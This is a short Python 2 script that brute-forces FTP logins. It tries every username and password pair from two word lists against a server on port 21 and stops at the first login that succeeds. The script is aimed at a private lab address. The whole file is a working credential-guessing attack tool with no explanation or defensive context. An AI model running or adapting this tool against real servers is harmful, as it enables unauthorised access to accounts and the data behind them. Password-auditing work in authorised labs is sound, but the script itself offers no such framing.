# coding=utf-8
import sys
import ftplib

BRUTE_BREAK = True

def Login(ServerIP, username, password):
    '''
    '''
    f = ftplib.FTP()
    f.connect(ServerIP, 21, timeout=10)
    print "Login FTP..."
    try:
        f.login(username, password)
    except ftplib.all_errors:
        print "Error:Server %s Cannot Login by the Account(%s,%s)" % (ServerIP, username, password)
        f.quit()
        return False

    return True


def Brute(ServerIP, userlist, passlist, Port=21):
    '''
    '''
    user_handler = open(userlist)
    pass_handler = open(passlist)
    try:
        user_line = user_handler.readlines()
        pass_line = pass_handler.readlines()
    finally:
        user_handler.close()
        pass_handler.close()

    for user in user_line:
        ftpuser = user.strip()
        for pwd in pass_line:
            ftppass = pwd.strip()
            print "testing account:(%s,%s)" % (ftpuser, ftppass)
            success = False
            try:
                success = Login(ServerIP, ftpuser, ftppass)
            except:
                continue
            if success:
                print "%s:%d-->(%s,%s) Success" % (ServerIP, Port, ftpuser, ftppass)
                if BRUTE_BREAK:
                    sys.exit(-1)

    print "---------------Brute End-----------------"
    # print user_line
    # print pass_line


if __name__ == "__main__":
    # sucess=LoginFtp('x.x.x.x','admin','admin')

    # if sucess:
    #    print "Login Success!"
    # else:
    #    print "Login Failed!"
    Brute("192.168.126.145", "username.lst", "password.lst")
